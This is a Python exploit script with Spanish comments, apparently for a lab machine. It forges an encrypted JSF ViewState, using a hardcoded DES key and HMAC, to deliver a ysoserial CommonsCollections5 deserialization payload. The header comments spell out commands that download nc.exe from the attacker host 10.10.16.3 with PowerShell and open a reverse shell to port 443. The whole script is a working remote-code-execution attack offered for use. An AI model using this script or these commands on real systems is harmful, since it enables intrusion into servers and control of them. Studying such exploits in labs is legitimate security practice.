#!/usr/bin/python3

# Explotacion de un STTI atraves de la cookie encryptada mediante una serializacion y deserializacion de la misma. 
# Creamos el payload con los recursos nc.exe en el mismo directorio
# java -jar ysoserial.jar CommonsCollections5 "powershell -c iwr -uri 'http://10.10.16.3/nc.exe' -o C:\Windows\Temp\nc.exe" > payload.bin 
# Ejecutamos el programa con un servidor python3 compartiendo el nc.exe
# java -jar ysoserial.jar CommonsCollections5 "cmd /c C:\Windows\Temp\nc.exe -e cmd 10.10.16.3 443" > payload.bin 
# Ponemos una session de nc a la escucha y ejecutamos para conseguir un rev shell 

import pyDes, hmac
import signal
import sys
import time
import requests
from base64 import b64encode, b64decode
from pwn import *
from hashlib import sha1

def ctrl_c(sig, frame):
        print("\n[-] Saliendo... [-]\n")
        sys.exit(1)

# Ctrl + C
signal.signal(signal.SIGINT, ctrl_c)

# Variables Globales
main_url = "http://10.10.10.130:8080/userSubscribe.faces"

# Usamos Ysoserial.jar para crear un archivo payload.bin (cmd /c ping -n 1 IP) el cual cargamos
def createpayload():

        payload = open("payload.bin", 'rb').read()
#       print(payload)
        return encrypt_data(payload)

def encrypt_data(payload):

        key = b64decode('SnNGOTg3Ni0=')
        obj = pyDes.des(key, pyDes.ECB, padmode=pyDes.PAD_PKCS5)

        # Encryptando el payload y añadiendo el HMAC value en Sha1
        encrypted_data = obj.encrypt(payload)
        hash_value = (hmac.new(key, bytes(encrypted_data), sha1).digest())
        encrypted_view_state = encrypted_data + hash_value

        return b64encode(encrypted_view_state)

def decrypt_view_state(view_state):

        key = b64decode('SnNGOTg3Ni0=') # Key o Secret
        view_state = b64decode(view_state) # decodificando la cadena encryptada
        view_state += b'\x00\x00\x00\x00' # sumando 4 bytes
        obj = pyDes.des(key, pyDes.ECB, padmode=pyDes.PAD_PKCS5) # Creando Un objeto para con pyDes pasarle el modo Decrypt
        view_state_decrypted = obj.decrypt(view_state) # Desencryptando View_State

        return view_state_decrypted

# Verificacion del payload creado
# print(createpayload())

def exploit():

        viewState = createpayload()


        data_post = {

                'javax.faces.ViewState': viewState
        }

        r = requests.post(main_url, data=data_post)
        
exploit()
